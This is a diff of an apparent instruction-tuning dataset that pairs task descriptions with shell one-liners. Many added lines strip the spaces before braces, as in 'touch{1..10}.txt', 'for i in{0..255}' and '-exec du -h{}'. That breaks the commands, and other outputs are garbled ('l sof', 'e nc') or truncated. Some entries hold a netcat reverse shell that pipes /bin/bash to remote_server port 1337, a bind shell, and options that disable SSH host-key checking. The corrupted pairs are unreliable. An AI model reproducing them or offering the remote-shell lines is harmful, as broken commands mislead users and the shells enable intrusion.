 {"instruction": "Print text string vertically, one character per line.", "output": "echo \"vertical text\" |  grep -o '.'"}
 {"instruction": "Find running binary executables that were not installed using dpkg", "output": "cat /var/lib/dpkg/info/*.list > /tmp/listin ;  ls /proc/*/exe |xargs -l  readlink |  grep -xvFf /tmp/listin;  rm /tmp/listin"}
 {"instruction": "Add prefix onto filenames", "output": "rename 's/^/prefix/' *"}
@@ -1835,7 +1464,7 @@
 {"instruction": "Files extension change", "output": "rename .oldextension .newextension *.oldextension"}
 {"instruction": "archive all files containing local changes (svn)", "output": "svn  st |  cut -c 8- |  sed 's/^/\\\"/;s/$/\\\"/' |  xargs  tar -czvf ../backup.tgz"}
 {"instruction": "Just run it ;)", "output": "echo SSBMb3ZlIFlvdQo= |  base64 -d"}
-{"instruction": "pattern match in awk - no grep", "output": "awk '/pattern1/ && /pattern2/ && !/pattern3/ {print}'"}
+{"instruction": "pattern match in awk - no grep", "output": "awk '/pattern1/ && /pattern2/ && !/pattern3/{print}'"}
 {"instruction": "Block an IP address from connecting to a server", "output": "iptables -A INPUT -s 222.35.138.25/32 -j DROP"}
 {"instruction": "Optimal way of deleting huge numbers of files", "output": "find /path/to/dir -type f -print0 |  xargs -0  rm"}
 {"instruction": "Optimal way of deleting huge numbers of files", "output": "rsync -a --delete empty-dir/ target-dir/"}
@@ -1845,7 +1474,7 @@
 {"instruction": "Kill a broken ssh connection", "output": "<Return>~."}
 {"instruction": "Convert JSON to YAML", "output": "ruby -ryaml -rjson -e 'puts YAML.dump(JSON.parse(STDIN.read))' < file.json > file.yaml"}
 {"instruction": "Convert Shell Text to Upper/Lower Case", "output": "ALT-U / ALT-L"}
-{"instruction": "Binary digits Matrix effect", "output": "perl -e '$|++;  while (1) {  print \" \" x (rand(35) + 1), int(rand(2)) }'"}
+{"instruction": "Binary digits Matrix effect", "output": "perl -e '$|++;  while (1){  print \" \" x (rand(35) + 1), int(rand(2)) }'"}
 {"instruction": "open two files side by side in vim (one window, two panes)", "output": "vim -O file1 file2"}
 {"instruction": "repeat a command every one second", "output": "watch -n 1 \"do foo\""}
 {"instruction": "Recursively find top 20 largest files (> 1MB) sort human readable format", "output": "find . -type f -print0 |  xargs -0  du -h |  sort -hr |  head -20"}
@@ -1861,7 +1490,7 @@
 {"instruction": "all out", "output": "pkill -KILL -u username"}
 {"instruction": "Run a ext4 file system check and badblocks scan with progress info", "output": "fsck.ext4 -cDfty -C 0 /dev/sdxx"}
 {"instruction": "Selecting a random file/folder of a folder", "output": "shuf -n1 -e *"}
-{"instruction": "List your MACs address", "output": "lsmac() {  ifconfig -a |  sed '/eth\\|wl/!d;s/   Link.*HWaddr//' ; }"}
+{"instruction": "List your MACs address", "output": "lsmac(){  ifconfig -a |  sed '/eth\\|wl/!d;s/   Link.*HWaddr//' ; }"}
 {"instruction": "ssh to machine behind shared NAT", "output": "ssh -NR 0.0.0.0:2222:127.0.0.1:22 user@jump.host.com"}
 {"instruction": "Countdown Clock", "output": "MIN=10;for ((i=MIN*60;i>=0;i--));do  echo -ne \"\\r$(date -d\"0+$i sec\" +%H:%M:%S)\";sleep 1;done"}
 {"instruction": "list all file extensions in a directory", "output": "find . -type f |  awk -F'.' '{print $NF}' |  sort|  uniq -c |  sort -g"}
@@ -1923,13 +1552,13 @@
 {"instruction": "Edit the last or previous command line in an editor then execute", "output": "fc [history-number]"}
 {"instruction": "Pause Current Thread", "output": "ctrl-z"}
 {"instruction": "Converts to PDF all the OpenOffice.org files in the directory", "output": "for i in $(ls *.od{tp}); do unoconv -f pdf $i; done"}
-{"instruction": "Create a bunch of dummy files for testing", "output": "touch {1..10}.txt"}
+{"instruction": "Create a bunch of dummy files for testing", "output": "touch{1..10}.txt"}
 {"instruction": "Shows size of dirs and files, hidden or not, sorted.", "output": "du -cs * .[^\\.]* |  sort -n"}
-{"instruction": "Convert .wma files to .ogg with ffmpeg", "output": "find -name '*wma' -exec  ffmpeg -i {} -acodec vorbis -ab 128k {}.ogg \\;"}
+{"instruction": "Convert .wma files to .ogg with ffmpeg", "output": "find -name '*wma' -exec  ffmpeg -i{} -acodec vorbis -ab 128k{}.ogg \\;"}
 {"instruction": "Find distro name and/or version/release", "output": "cat /etc/*-release"}
 {"instruction": "Generate Random Passwords", "output": "< /dev/urandom  tr -dc _A-Z-a-z-0-9 |  head -c6"}
 {"instruction": "bash shortcut: !$ !^ !* !:3 !:h and !:t", "output": "echo foo bar foobar barfoo &&  echo !$ !^  !:3 !* &&   echo /usr/bin/foobar&&  echo !$:h !$:t"}
-{"instruction": "Find recursively, from current directory down, files and directories whose names contain single or multiple whitespaces and replace each such occurrence with a single underscore.", "output": "find  ./  -name '*'  -exec   rename  's/\\s+/_/g'  {}  \\;"}
+{"instruction": "Find recursively, from current directory down, files and directories whose names contain single or multiple whitespaces and replace each such occurrence with a single underscore.", "output": "find  ./  -name '*'  -exec   rename  's/\\s+/_/g'{}  \\;"}
 {"instruction": "Tells which group you DON'T belong to (opposite of command \"groups\") --- uses sed", "output": "sed -e \"/$USER/d;s/:.*//g\" /etc/group |  sed -e :a -e '/$/N;s/"}
 {"instruction": "Quickly get summary of sizes for files and folders", "output": "du -sh *"}
 {"instruction": "Host cpu performance", "output": "openssl speed md5"}
@@ -1939,14 +1568,14 @@
 {"instruction": "Retry the previous command until it exits successfully", "output": "!!;  while [ $? -ne 0 ]; do !!; done"}
 {"instruction": "Play awesome rythmic noise using aplay", "output": "echo \"main(i){for(i=0;;i++)putchar(((i*(i>>8|i>>9)&46&i>>8))^(i&i>>13|i>>6));}\" |  gcc -x c - && ./a.out |  aplay"}
 {"instruction": "Turns red the stderr output", "output": "color()(set -o pipefail;\"$@\" 2>&1>&3|sed $'s,.*,\\e[31m&\\e[m,'>&2)3>&1"}
-{"instruction": "Recursively unrar into dir containing archive", "output": "find . -name '*.rar' -execdir  unrar e {} \\;"}
+{"instruction": "Recursively unrar into dir containing archive", "output": "find . -name '*.rar' -execdir  unrar e{} \\;"}
 {"instruction": "Temporarily ignore mismatched SSH host key", "output": "ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no username@host"}
 {"instruction": "Remove all zero size files from current directory (not recursive)", "output": "find . -maxdepth 1 -size 0c -delete"}
 {"instruction": "Watch the progress of 'dd'", "output": "pv -tpreb /dev/urandom |  dd of=file.img"}
 {"instruction": "Get a stream feed from a Twitter user", "output": "step1 ; step2 ; step3 ; step4 ;  curl -o- --get 'https://stream.twitter.com/1/statuses/filter.json' --header \"$oauth_header\" --data \"follow=$id\""}
-{"instruction": "Create the authorization header required for a Twitter stream feed", "output": "step4() { oauth_header=\"Authorization: OAuth oauth_consumer_key=\\\"$k1\\\", oauth_nonce=\\\"$once\\\", oauth_signature=\\\"$signature\\\", oauth_signature_method=\\\"HMAC-SHA1\\\", oauth_timestamp=\\\"$ts\\\", oauth_token=\\\"$k3\\\", oauth_version=\\\"1.0\\\"\" ; }"}
+{"instruction": "Create the authorization header required for a Twitter stream feed", "output": "step4(){ oauth_header=\"Authorization: OAuth oauth_consumer_key=\\\"$k1\\\", oauth_nonce=\\\"$once\\\", oauth_signature=\\\"$signature\\\", oauth_signature_method=\\\"HMAC-SHA1\\\", oauth_timestamp=\\\"$ts\\\", oauth_token=\\\"$k3\\\", oauth_version=\\\"1.0\\\"\" ; }"}
 {"instruction": "Create the signature base string required for a Twitter stream feed", "output": "step2(){ b=\"GET&https%3A%2F%2Fstream.twitter.com%2F1%2Fstatuses%2Ffilter.json&follow%3D${id}%26oauth_consumer_key%3D${k1}%26oauth_nonce%3D${once}%26oauth_signature_method%3DHMAC-SHA1%26oauth_timestamp%3D${ts}%26oauth_token%3D${k3}%26oauth_version%3D1.0\";}"}
-{"instruction": "Create the oauth token required for a Twitter stream feed", "output": "step3() { s=$( echo -n $b |  openssl dgst -sha1 -hmac $hmac -binary |  openssl base64); signature=`for((i=0;i<${#s};i++)); do  case ${s:i:1} in +) e %2B;; /) e %2F;; =) e %3D;; *) e ${s:i:1};; esac ; done` ; } ; e() {  echo -n $1; }"}
+{"instruction": "Create the oauth token required for a Twitter stream feed", "output": "step3(){ s=$( echo -n $b |  openssl dgst -sha1 -hmac $hmac -binary |  openssl base64); signature=`for((i=0;i<${#s};i++)); do  case ${s:i:1} in +) e %2B;; /) e %2F;; =) e %3D;; *) e ${s:i:1};; esac ; done` ; } ; e(){  echo -n $1; }"}
 {"instruction": "Check your spelling", "output": "aspell -a <<< '<WORDS>'"}
 {"instruction": "Find all files larger than 500M and less than 1GB", "output": "find / -type f -size +500M -size -1G"}
 {"instruction": "Show bandwidth use oneliner", "output": "while true; do  cat /proc/net/dev;  sleep 1; done |  awk -v dc=\"date \\\"+%T\\\"\" '/eth0/{i = $2 - oi; o = $10 - oo; oi = $2; oo = $10; dc|getline d; close(dc);  if (a++)  printf \"%s %8.2f KiB/s in %8.2f KiB/s out"}
@@ -1962,7 +1591,7 @@
 {"instruction": "Screensaver", "output": "alias screensaver='for ((;;)); do  echo -ne \"\\033[$((1+RANDOM%LINES));$((1+RANDOM%COLUMNS))H\\033[$((RANDOM%2));3$((RANDOM%8))m$((RANDOM%10))\";  sleep 0.1 ; done'"}
 {"instruction": "ROT13 using the tr command", "output": "alias rot13=\"tr a-zA-Z n-za-mN-ZA-M\""}
 {"instruction": "Bash logger", "output": "script /tmp/log.txt"}
-{"instruction": "Recursively search for large files. Show size and location.", "output": "find . -size +100000k -exec  du -h {} \\;"}
+{"instruction": "Recursively search for large files. Show size and location.", "output": "find . -size +100000k -exec  du -h{} \\;"}
 {"instruction": "Make vim open in tabs by default (save to .profile)", "output": "alias vim=\"vim -p\""}
 {"instruction": "Rename HTML files according to their title tag", "output": "perl -wlne'/title>([^<]+)/i&&rename$ARGV,\"$1.html\"' *.html"}
 {"instruction": "Secure copy from one server to another without rsync and preserve users, etc", "output": "tar -czvf - /src/dir |  ssh remotehost \"(cd /dst/dir ;  tar -xzvf -)\""}
@@ -1970,26 +1599,26 @@
 {"instruction": "Binary clock", "output": "perl -e 'for(;;){@d=split(\"\",`date +%H%M%S`);print\"\\r\";for(0..5){printf\"%.4b \",$d[$_]}sleep 1}'"}
 {"instruction": "Function to split a string into an array", "output": "read -a ARR <<<'world domination now!';  echo ${ARR[2]};"}
 {"instruction": "Generate MD5 hash for a string", "output": "md5sum <<<\"test\""}
-{"instruction": "Recompress all .gz files in current directory using bzip2 running 1 job per CPU core in parallel", "output": "parallel -j+0 \"zcat {} |  bzip2 >{.}.bz2 &&  rm {}\" ::: *.gz"}
+{"instruction": "Recompress all .gz files in current directory using bzip2 running 1 job per CPU core in parallel", "output": "parallel -j+0 \"zcat{} |  bzip2 >{.}.bz2 &&  rm{}\" ::: *.gz"}
 {"instruction": "phpinfo from the command line", "output": "php -i"}
-{"instruction": "Escape potential tarbombs", "output": "atb() { l=$( tar tf $1);  if [ $(echo \"$l\" |  wc -l) -eq $(echo \"$l\" |  grep $(echo \"$l\" |  head -n1) |  wc -l) ]; then  tar xf $1; else  mkdir ${1%. tar.gz} &&  tar xf $1 -C ${1%. tar.gz}; fi ;}"}
+{"instruction": "Escape potential tarbombs", "output": "atb(){ l=$( tar tf $1);  if [ $(echo \"$l\" |  wc -l) -eq $(echo \"$l\" |  grep $(echo \"$l\" |  head -n1) |  wc -l) ]; then  tar xf $1; else  mkdir ${1%. tar.gz} &&  tar xf $1 -C ${1%. tar.gz}; fi ;}"}
 {"instruction": "pretend to be busy in office to enjoy a cup of coffee", "output": "while [  true ]; do  head -n 100 /dev/urandom;  sleep .1; done |  hexdump -C |  grep \"ca fe\""}
 {"instruction": "runs a X session within your X session", "output": "ssh -C -Y -l$USER xserver.mynet.xx 'Xnest -geometry 1900x1150 -query localhost'"}
 {"instruction": "Find all symlinks that link to directories", "output": "find -type l -xtype d"}
 {"instruction": "Have a random \"cow\" say a random thing", "output": "fortune |  cowsay -f $(ls /usr/share/ cowsay/cows/ |  shuf -n1)"}
 {"instruction": "sends a postscript file to a postscript printer using netcat", "output": "cat my.ps |  nc -q 1 hp4550.mynet.xx 9100"}
 {"instruction": "Display which distro is installed", "output": "cat /etc/*release"}
-{"instruction": "Fetch every font from dafont.com to current folder", "output": "d=\"www.dafont.com/alpha.php?\"; for c in {a..z}; do l=`curl -s \"${d}lettre=${c}\"|sed -n 's/.*ge=\\([0-9]\\{2\\}\\).*/\\1/p'`; for((p=1;p<=l;p++));do  for u in `curl -s \"${d}page=${p}&lettre=${c}\"|egrep -o \"http\\S*.com/dl/\\?f=\\w*\"`;do  aria2c \"${u}\";done;done;done"}
+{"instruction": "Fetch every font from dafont.com to current folder", "output": "d=\"www.dafont.com/alpha.php?\"; for c in{a..z}; do l=`curl -s \"${d}lettre=${c}\"|sed -n 's/.*ge=\\([0-9]\\{2\\}\\).*/\\1/p'`; for((p=1;p<=l;p++));do  for u in `curl -s \"${d}page=${p}&lettre=${c}\"|egrep -o \"http\\S*.com/dl/\\?f=\\w*\"`;do  aria2c \"${u}\";done;done;done"}
 {"instruction": "Realtime lines per second in a log file", "output": "tail -f access.log |  pv -l -i10 -r >/dev/null"}
 {"instruction": "intercept stdout/stderr of another process", "output": "strace -ff -e write=1,2 -s 1024 -p PID  2>&1 |  grep \"^ |\" |  cut -c11-60 |  sed -e 's/ //g' |  xxd -r -p"}
 {"instruction": "send DD a signal to print its progress", "output": "while :;do  killall -USR1 dd;sleep 1;done"}
-{"instruction": "See your current RAM frequency", "output": "dmidecode -t 17 |  awk -F\":\" '/Speed/ {  print $2 }'"}
+{"instruction": "See your current RAM frequency", "output": "dmidecode -t 17 |  awk -F\":\" '/Speed/{  print $2 }'"}
 {"instruction": "scp with compression.", "output": "scp -C 10.0.0.4:/tmp/backup.sql /path/to/backup.sql"}
 {"instruction": "Perl Command Line Interpreter", "output": "perl -e 'while(1){print\"> \";eval<>}'"}
 {"instruction": "Find unused IPs on a given subnet", "output": "nmap -T4 -sP 192.168.2.0/24 &&  egrep \"00:00:00:00:00:00\" /proc/net/arp"}
 {"instruction": "Change the From: address on the fly for email sent from the command-line", "output": "mail -s \"subject\" user@todomain.com <e mailbody.txt  -- -f customfrom@fromdomain.com -F 'From Display Name'"}
 {"instruction": "find and delete empty dirs, start in current working dir", "output": "find . -type d -empty -delete"}
-{"instruction": "Check which files are opened by Firefox then sort by largest size.", "output": "l sof -p $(pidof firefox) |  awk '/.mozilla/ {  s = int($7/(2^20)); if( s>0)  print ( s)\" MB -- \"$9 | \" sort -rn\" }'"}
+{"instruction": "Check which files are opened by Firefox then sort by largest size.", "output": "l sof -p $(pidof firefox) |  awk '/.mozilla/{  s = int($7/(2^20)); if( s>0)  print ( s)\" MB -- \"$9 | \" sort -rn\" }'"}
 {"instruction": "Use colordiff in side-by-side mode, and with automatic column widths.", "output": "colordiff -yW\"`tput cols`\" /path/to/file1 /path/to/file2"}
 {"instruction": "extract email adresses from some file (or any other pattern)", "output": "grep -Eio '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\\.[[:alpha:].]{2,6})'"}
 {"instruction": "geoip information", "output": "curl -s \"http://www.geody.com/geoip.php?ip=$( curl -s icanhazip.com)\" |  sed '/^IP:/!d;s/<[^>][^>]*>//g'"}
@@ -2009,11 +1638,11 @@
 {"instruction": "Multiple SSH Tunnels", "output": "ssh -L :: -L :: @"}
 {"instruction": "Redirect incoming traffic to SSH, from a port of your choosing", "output": "iptables -t nat -A PREROUTING -p tcp --dport [port of your choosing] -j REDIRECT --to-ports 22"}
 {"instruction": "LDAP search to query an ActiveDirectory server", "output": "ldapsearch -LLL -H ldap://activedirectory.example.com:389 -b 'dc=example,dc=com' -D 'DOMAIN\\Joe.Bloggs' -w 'p@ssw0rd' '(sAMAccountName=joe.bloggs)'"}
-{"instruction": "Easily scp a file back to the host you're connecting from", "output": "mecp () {  scp \"$@\" ${SSH_CLIENT%% *}:Desktop/; }"}
+{"instruction": "Easily scp a file back to the host you're connecting from", "output": "mecp (){  scp \"$@\" ${SSH_CLIENT%% *}:Desktop/; }"}
 {"instruction": "Super Speedy Hexadecimal or Octal Calculations and Conversions to Decimal.", "output": "echo \"$(( 0x10 )) - $(( 010 )) = $(( 0x10 - 010 ))\""}
-{"instruction": "find and replace tabs for spaces within files recursively", "output": "find ./ -type f -exec  sed -i 's/\\t/  /g' {} \\;"}
+{"instruction": "find and replace tabs for spaces within files recursively", "output": "find ./ -type f -exec  sed -i 's/\\t/  /g'{} \\;"}
 {"instruction": "alt + 1 .", "output": "alt + 1 ."}
-{"instruction": "sends your internal IP by email", "output": "ifconfig en1 |  awk '/inet / {print $2}' |  mail -s \"hello world\" e mail@e mail.com"}
+{"instruction": "sends your internal IP by email", "output": "ifconfig en1 |  awk '/inet /{print $2}' |  mail -s \"hello world\" e mail@e mail.com"}
 {"instruction": "synchronicity", "output": "cal 09 1752"}
 {"instruction": "Terminal redirection", "output": "script /dev/null |  tee /dev/pts/3"}
 {"instruction": "Use mtr to create a text file report", "output": "mtr --report --report-cycles 10 www.google.com > google_net_report.txt"}
@@ -2039,7 +1668,7 @@
 {"instruction": "Show running services (using systemctl)", "output": "command  systemctl --no-page --no-legend --plain -t  service --state=running"}
 {"instruction": "Convert all JPEG images to MP4", "output": "cat *.jpg |  ffmpeg -f image2pipe -r 1 -vcodec mjpeg -i - -vcodec libx264 out.mp4"}
 {"instruction": "Binary clock", "output": "perl -e 'for(;;sleep 1){printf\"\\r\".\"%.4b \"x6,split\"\",`date +%H%M%S`}'"}
-{"instruction": "Bare Metal IRC Client", "output": "nik=clf$RANDOM;sr=irc.efnet.org;expect -c \"set  timeout -1;spawn  nc $sr 6666;set send_human {.1 .2 1 .2 1};expect AUTH*"}
+{"instruction": "Bare Metal IRC Client", "output": "nik=clf$RANDOM;sr=irc.efnet.org;expect -c \"set  timeout -1;spawn  nc $sr 6666;set send_human{.1 .2 1 .2 1};expect AUTH*"}
 {"instruction": "pulsed terminal clock", "output": "clear;while true;sleep 1;do for((a=1;a<=$( tput cols)/3;a++));do  tput cup 0 $a;echo \" \" $(date);done;sleep 1;for((a;a>=1;a--));do  tput cup 0 $a;echo $(date) \" \";done;done"}
 {"instruction": "Submit command & rewrite orginal command", "output": "<ctrl>+o"}
 {"instruction": "Encrypted chat with netcat and openssl (one-liner)", "output": "server$ while true; do  read -n30 ui;  echo $ui | openssl e nc -aes-256-ctr -a -k PaSSw; done |  nc -l -p 8877 |  while  read so; do decoded_so=` echo \"$so\"|  openssl e nc -d -a -aes-256-ctr -k PaSSw`;  echo -e \"I ncoming: $decoded_so\"; done"}
@@ -2055,10 +1684,10 @@
 {"instruction": "Emulating netcat -e (netcat-traditional or netcat-openbsd) with the gnu-netcat", "output": "mkfifo foo ;  nc -lk 2600 0<foo | /bin/bash 1>foo"}
 {"instruction": "Find biggest 10 files in current and subdirectories and sort by file size", "output": "find . -type f -print0 |  xargs -0  du -h |  sort -hr |  head -10"}
 {"instruction": "Get your external IP and Network Info", "output": "curl ifconfig.me/all"}
-{"instruction": "Quickly CD Out Of Directories Without 5+ Aliases", "output": "up() {  local x='';for i in $(seq ${1:-1});do x=\"$x../\"; done;cd $x; }"}
+{"instruction": "Quickly CD Out Of Directories Without 5+ Aliases", "output": "up(){  local x='';for i in $(seq ${1:-1});do x=\"$x../\"; done;cd $x; }"}
 {"instruction": "List all commands present on system", "output": "ls ${PATH//:/ }"}
 {"instruction": "A line across the entire width of the terminal", "output": "printf \"%$(tput cols)s"}
-{"instruction": "Create the four oauth keys required for a Twitter stream feed", "output": "step1() { k1=\"Consumer key\" ; k2=\"Consumer secret\" ; k3=\"Access token\" ; k4=\"Access token secret\" ; once=$RANDOM ; ts=$(date +%s) ; hmac=\"$k2&$k4\" ; id=\"19258798\" ; }"}
+{"instruction": "Create the four oauth keys required for a Twitter stream feed", "output": "step1(){ k1=\"Consumer key\" ; k2=\"Consumer secret\" ; k3=\"Access token\" ; k4=\"Access token secret\" ; once=$RANDOM ; ts=$(date +%s) ; hmac=\"$k2&$k4\" ; id=\"19258798\" ; }"}
 {"instruction": "Check if a machine is online", "output": "ping -c 1 -q MACHINE_IP_OR_NAME >/dev/null 2>&1 &&  echo ONLINE ||  echo OFFLINE"}
 {"instruction": "diff the outputs of two programs", "output": "diff <(exiftool img_1.jpg) <(exiftool img_2.jpg)"}
 {"instruction": "put an unpacked .deb package back together", "output": "dpkg-repack  firefox"}
@@ -2071,11 +1700,11 @@
 {"instruction": "Show IP Address in prompt --> PS1 var", "output": "export PS1=\"[\\u@`hostname -I` \\W]$ \""}
 {"instruction": "log a command to console and to 2 files separately stdout and stderr", "output": "command > >(tee stdout.log) 2> >(tee stderr.log >&2)"}
 {"instruction": "Join lines split with backslash at the end", "output": "sed -e '/\\\\$/{:0;N;s/\\\\"}
-{"instruction": "Convert text to lowercase", "output": "lower() {  echo ${@,,}; }"}
+{"instruction": "Convert text to lowercase", "output": "lower(){  echo ${@,,}; }"}
 {"instruction": "find builtin in bash v4+", "output": "ls -l /etc/**/*killall"}
 {"instruction": "make image semi-transparent", "output": "convert input.png -alpha  set -channel A -fx 0.5 output.png"}
 {"instruction": "execute a shell with netcat without -e", "output": "mknod backpipe p &&  nc remote_server 1337 0<backpipe | /bin/bash 1>backpipe"}
-{"instruction": "output length of longest line", "output": "awk '(length > n) {n = length} END {print n}'"}
+{"instruction": "output length of longest line", "output": "awk '(length > n){n = length} END{print n}'"}
 {"instruction": "Save your terminal commands in bash history in real time", "output": "shopt -s histappend ; PROMPT_COMMAND=\"history -a;$PROMPT_COMMAND\""}
 {"instruction": "Connect via SSH to VirtualBox guest VM without knowing IP address", "output": "ssh vm-user@`VBoxManage guestproperty get \"vm-name\" \"/VirtualBox/GuestInfo/Net/0/V4/IP\" |  awk '{  print $2 }'`"}
 {"instruction": "Make redirects to localhost via /etc/hosts more interesting", "output": "sudo  socat TCP4-LISTEN:80,bind=127.0.0.1,fork EXEC:'echo \"HTTP/1.1 503 Service Unavailable\";'"}
@@ -2083,7 +1712,7 @@
 {"instruction": "Terrorist threat level text", "output": "echo \"Terrorist threat level: `od -An -N1 -i /dev/random`\""}
 {"instruction": "Use wget to download one page and all it's requisites for offline viewing", "output": "wget -e robots=off -E -H -k -K -p http://<page>"}
 {"instruction": "Convert a string to \"Title Case\"", "output": "echo \"this is a test\" |  sed 's/.*/\\L&/; s/[a-z]*/\\u&/g'"}
-{"instruction": "RTFM function", "output": "rtfm() { help $@ ||  info $@ ||  man $@ || $BROWSER \"http://www.google.com/search?q=$@\"; }"}
+{"instruction": "RTFM function", "output": "rtfm(){ help $@ ||  info $@ ||  man $@ || $BROWSER \"http://www.google.com/search?q=$@\"; }"}
 {"instruction": "back ssh from firewalled hosts", "output": "ssh -R 5497:127.0.0.1:22 -p 62220 user@public.ip"}
 {"instruction": "rename files according to file with colums of corresponding names", "output": "xargs -n 2  mv < file_with_colums_of_names"}
 {"instruction": "Create a new file", "output": ">  file"}
@@ -2100,18 +1729,18 @@
 {"instruction": "Setting global redirection of STDERR to STDOUT in a script", "output": "exec 2>&1"}
 {"instruction": "Outgoing IP of server", "output": "dig +short @resolver1.opendns.com myip.opendns.com"}
 {"instruction": "Isolate file name from full path/find output", "output": "echo ${fullpath##*/}"}
-{"instruction": "Show numerical values for each of the 256 colors in bash", "output": "for i in {0..255}; do  echo -e \"\\e[38;05;${i}m${i}\"; done |  column -c 80 -s '  ';  echo -e \"\\e[m\""}
+{"instruction": "Show numerical values for each of the 256 colors in bash", "output": "for i in{0..255}; do  echo -e \"\\e[38;05;${i}m${i}\"; done |  column -c 80 -s '  ';  echo -e \"\\e[m\""}
 {"instruction": "Use Kernighan & Ritchie coding style in C program", "output": "indent -kr hello.c"}
 {"instruction": "Delay execution until load average falls under 1.5", "output": "echo 'some command' |  batch"}
 {"instruction": "backup with mysqldump a really big mysql database to a remote machine over ssh", "output": "mysqldump -q --skip-opt --force --log-error=dbname_error.log -uroot -pmysqlpassword dbname |  ssh -C user@ sshserver 'cd /path/to/backup/dir;  cat > dbname.sql'"}
 {"instruction": "Tail -f at your own pace", "output": "tail -fs 1 somefile"}
 {"instruction": "Watch the progress of 'dd'", "output": "dd if=/dev/zero |  pv |  dd of=/dev/null"}
-{"instruction": "Smart `cd`.. cd to the file directory if you try to cd to a file", "output": "cd() {  if [ -z \"$1\" ]; then  command  cd; else  if [ -f \"$1\" ]; then  command  cd $(dirname \"$1\"); else  command  cd \"$1\"; fi; fi; }"}
+{"instruction": "Smart `cd`.. cd to the file directory if you try to cd to a file", "output": "cd(){  if [ -z \"$1\" ]; then  command  cd; else  if [ -f \"$1\" ]; then  command  cd $(dirname \"$1\"); else  command  cd \"$1\"; fi; fi; }"}
 {"instruction": "Temporarily ignore known SSH hosts", "output": "ssh -o UserKnownHostsFile=/dev/null root@192.168.1.1"}
 {"instruction": "dd with progress bar", "output": "dd if=/dev/nst0 |pv| dd of=restored_file.tar"}
 {"instruction": "Save the Top 2500 commands from commandlinefu to a single text file", "output": "curl http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-2500:25] |  grep -v _ curl_ > comfu.txt"}
 {"instruction": "Simple addicting bash game.", "output": "count=\"1\" ;  while  true ; do  read  next ;  if [[ \"$ next\" = \"$last\" ]] ; then count=$(($count+1)) ;  echo \"$count\" ; else count=\"1\" ;  echo $count ; fi ; last=\"$ next\" ; done"}
-{"instruction": "Query Wikipedia via console over DNS", "output": "mwiki() {  dig +short txt \"$*\".wp.dg.cx; }"}
+{"instruction": "Query Wikipedia via console over DNS", "output": "mwiki(){  dig +short txt \"$*\".wp.dg.cx; }"}
 {"instruction": "Print a row of 50 hyphens", "output": "python -c 'print \"-\"*50'"}
 {"instruction": "Display a wave pattern", "output": "ruby -e \"i=0;loop{puts ' '*(29*(Math.sin(i)/2+1))+'|'*(29*(Math.cos(i)/2+1)); i+=0.1}\""}
 {"instruction": "grep tab chars", "output": "grep \"^V<TAB>\" your_file"}
@@ -2119,19 +1748,19 @@
 {"instruction": "Using mplayer to play the audio only but suppress the video", "output": "mplayer -novideo something.mpg"}
 {"instruction": "Using mplayer to play the audio only but suppress the video", "output": "mplayer -vo null something.mpg"}
 {"instruction": "create a temporary file in a command line call", "output": "any_script.sh < <(some command)"}
-{"instruction": "shell function to make gnu info act like man.", "output": "my info() {  info --subnodes -o - $1 | less; }"}
+{"instruction": "shell function to make gnu info act like man.", "output": "my info(){  info --subnodes -o - $1 | less; }"}
 {"instruction": "Get your commandlinefu points (upvotes - downvotes)", "output": "username=matthewbauer;  curl -s http://www.commandlinefu.com/commands/by/$username/json |  tr '{' '"}
 {"instruction": "Replace spaces in filenames with underscores", "output": "for f in *;do  mv \"$f\" \"${f// /_}\";done"}
 {"instruction": "Insert the last argument of the previous command", "output": "!$"}
 {"instruction": "Remote control for Rhythmbox on an Ubuntu Media PC", "output": "alias rc='ssh ${MEDIAPCHOSTNAME}  env DISPLAY=:0.0 rhythmbox-client --no-start'"}
 {"instruction": "Remove everything except that file", "output": "find . ! -name <FILENAME> -delete"}
-{"instruction": "Remove today's Debian installed packages", "output": "grep -e `date +%Y-%m-%d` /var/log/dpkg.log |  awk '/install / {print $4}' |  uniq |  xargs  apt-get -y remove"}
+{"instruction": "Remove today's Debian installed packages", "output": "grep -e `date +%Y-%m-%d` /var/log/dpkg.log |  awk '/install /{print $4}' |  uniq |  xargs  apt-get -y remove"}
 {"instruction": "Amazing real time picture of the sun in your wallpaper", "output": "curl http://sohowww.nascom.nasa.gov/data/realtime/eit_195/512/latest.jpg | xli -onroot -fill stdin"}
 {"instruction": "bash screensaver off", "output": "setterm -powersave off -blank 0"}
 {"instruction": "Monitor a file's size", "output": "watch -n60  du /var/log/messages"}
 {"instruction": "Smart renaming", "output": "mmv 'banana_*_*.asc' 'banana_#2_#1.asc'"}
 {"instruction": "is today the end of the month?", "output": "[ `date --date='next day' +'%B'` == `date +'%B'` ] ||  echo 'end of month'"}
-{"instruction": "Port scan a range of hosts with Netcat.", "output": "for i in {21..29}; do  nc -v -n -z -w 1 192.168.0.$i 443; done"}
+{"instruction": "Port scan a range of hosts with Netcat.", "output": "for i in{21..29}; do  nc -v -n -z -w 1 192.168.0.$i 443; done"}
 {"instruction": "Log your internet download speed", "output": "echo $(date +%s) > start-time; URL=http://www.google.com;  while true; do  echo $(curl -L --w %{speed_download} -o/dev/null -s $URL) >> bps;  sleep 10; done &"}
 {"instruction": "Show Directories in the PATH Which does NOT Exist", "output": "(IFS=:;for p in $PATH; do  test -d $p ||  echo $p; done)"}
 
